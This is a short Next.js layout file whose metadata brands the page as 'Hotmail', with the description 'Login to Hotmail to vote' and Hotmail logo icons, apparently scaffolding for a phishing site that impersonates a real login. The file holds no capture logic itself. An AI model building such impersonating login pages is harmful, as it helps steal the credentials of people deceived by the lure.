import { Inter } from "next/font/google";
// import HotmailPage from "../hotmail/page";

const inter = Inter({ subsets: ["latin"] });

export const metadata = {
  title: "Hotmail",
  description: "Login to Hotmail to vote",

  icons: {
    icon: [
      {
        url: "/hotmail-logo.avif",
      },
    ],
    shortcut: ["/hotmail-logo.avif"],
    apple: [
      {
        url: "/hotmail-logo.avif",
      },
      {
        url: "/hotmail-logo.avif",
        sizes: "180x180",
        type: "image/avif",
      },
    ],
  },
};

export default function RootLayout({ children }) {
  return <main>{children}</main>;
}
